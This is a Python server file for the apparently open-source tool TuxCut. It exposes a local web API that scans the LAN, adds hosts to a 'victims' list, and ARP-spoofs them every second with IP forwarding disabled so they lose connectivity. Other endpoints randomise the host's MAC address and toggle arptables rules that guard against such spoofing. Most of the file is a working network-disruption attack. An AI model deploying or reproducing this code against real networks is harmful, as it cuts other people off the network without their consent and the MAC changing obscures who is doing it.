import sys
import datetime as dt
import json
import atexit
from setproctitle import setproctitle
import logging
import subprocess as sp
import netifaces
from scapy.all import *
from scapy.layers.l2 import arping
from bottle import route, run
from bottle import request, response

from apscheduler.schedulers.background import BackgroundScheduler
from apscheduler.triggers.interval import IntervalTrigger


from server.utils import logger
from server.utils import get_default_gw, get_my, get_hostname, generate_mac
from server.utils import enable_ip_forward, disable_ip_forward, arp_spoof, arp_unspoof

setproctitle('tuxcut-server')
victims = list()


def attack_victims():
    if len(victims) > 0:
        disable_ip_forward()
        for victim in victims:
            arp_spoof(victim)


scheduler = BackgroundScheduler()
scheduler.start()
scheduler.add_job(
    func=attack_victims,
    trigger=IntervalTrigger(seconds=1),
    id='arp_attack_job',
    name='ARP Spoofing the victim list',
    replace_existing=True)


# Shut down the scheduler when exiting the app
def on_server_exit():
    logger.info('TuxCut server is stopped')
    enable_ip_forward()
    scheduler.shutdown()


atexit.register(on_server_exit)

@route('/status')
def server_status():
    """
    check if server is running
    """
    response.headers['Content-Type'] = 'application/json'

    return json.dumps({
        'status': 'success',
        'msg': 'TuxCut server is running'
    })


@route('/my/<iface>')
def get_my_info(iface):
    """
    find the IP and MAC  addressess for the given interface
    """
    response.headers['Content-Type'] = 'application/json'

    my = get_my(iface)

    return json.dumps({
        'status': 'success',
        'my': my
    })


@route('/gw')
def get_gw():
    """
    Get the default gw ip address with the iface
    """
    response.headers['Content-Type'] = 'application/json'
    gw = get_default_gw()
    if gw:
        return json.dumps({
            'status': 'success',
            'gw': gw
        })
    else:
        logger.info('No valid internet Connection')
        return json.dumps({
            'status': 'error',
            'msg': 'This computer is not connected'
        })


@route('/scan/<gw_ip>')
def scan(gw_ip):
    response.headers['Content-Type'] = 'application/json'
    live_hosts = list()
    logger.info('Start scanning {}'.format(gw_ip))
    ans, unans = arping('{}/24'.format(gw_ip), verbose=False)
    logger.info('ans: {}'.format(ans))
    logger.info('unans: {} '.format(unans))
    for i in range(0, len(ans)):
        live_hosts.append({
            'ip': ans[i][1].psrc,
            'mac': ans[i][1].hwsrc,
            'hostname': get_hostname(ans[i][1].psrc)
        })
    logger.info('live hosts: {}'.format(live_hosts))
    return json.dumps({
        'result': {
            'status': 'success',
            'hosts': live_hosts
        }
    })


@route('/protect', method='POST')
def enable_protection():
    response.headers['Content-Type'] = 'application/json'

    gw_ip = request.forms.get('ip')
    gw_mac = request.forms.get('mac')

    try:
        sp.Popen(['arptables', '-F'])
        sp.Popen(['arptables', '-P', 'INPUT', 'DROP'])
        sp.Popen(['arptables', '-P', 'OUTPUT', 'DROP'])
        sp.Popen(['arptables', '-A', 'INPUT', '-s', gw_ip, '--source-mac', gw_mac, '-j', 'ACCEPT'])
        sp.Popen(['arptables', '-A', 'OUTPUT', '-d', gw_ip, '--destination-mac', gw_mac, '-j', 'ACCEPT'])
        sp.Popen(['arp', '-s',  gw_ip, gw_mac ])
        return json.dumps({
            'status': 'success',
            'msg': 'Protection Enabled'
        })
    except Exception as e:
        logger.error(sys.exc_info()[1], exc_info=True)
        return json.dumps({
            'status': 'error',
            'msg': sys.exc_info()[1]
        })


@route('/unprotect')
def disable_protection():
    response.headers['Content-Type'] = 'application/json'
    try:
        sp.Popen(['arptables', '-P', 'INPUT', 'ACCEPT'])
        sp.Popen(['arptables', '-P', 'OUTPUT', 'ACCEPT'])
        sp.Popen(['arptables', '-F'])
        return json.dumps({
            'status': 'success',
            'msg': 'Protection Disabled'
        })

    except Exception as e:
        logger.error(sys.exc_info()[1], exc_info=True)
        return json.dumps({
            'status': 'error',
            'msg': sys.exc_info()[1]
        })


@route('/cut', method='POST')
def add_to_victims():
    response.headers['Content-Type'] = 'application/json'

    new_victim = request.json
    if new_victim not in victims:
        victims.append(new_victim)

    return json.dumps({
        'status': 'success',
        'msg': 'new victim add'
    })


@route('/resume', method='POST')
def resume_victim():
    response.headers['Content-Type'] = 'application/json'

    victim = request.json
    if victim in victims:
        victims.remove(victim)
    arp_unspoof(victim)

    return json.dumps({
        'status': 'success',
        'msg': 'victim  resumed'
    })

@route('/change-mac/<iface>')
def scan(iface):
    response.headers['Content-Type'] = 'application/json'
    logger.info('Changing MAC Address for interface {}'.format(iface))
    new_MAC = generate_mac()
    try:
        # sp.Popen(['ifconfig', iface, 'down'], stdout=sp.PIPE)
        sp.Popen(['ifconfig', iface, 'down', 'hw', 'ether', new_MAC], stdout=sp.PIPE)
        sp.Popen(['ifconfig', iface, 'up'], stdout=sp.PIPE)
        logger.info('MAC Address for interface {} Changed to {}'.format(iface, new_MAC))
        return json.dumps({
            'result': {
                'status': 'success'
            }
        })
    except Exception as e:
        logger.error(sys.exc_info()[1], exc_info=True)
        return json.dumps({
            'result': {
                'status': 'failed'
            }
        })

def isOnRootPrivilege():
    if not os.geteuid() == 0:
        sys.exit("\nOnly root can run this script\n")

    run(host='127.0.0.1', port=8013, reloader=True)
    logger.info('TuxCut server successfully started')

if __name__ == '__main__':
    isOnRootPrivilege()
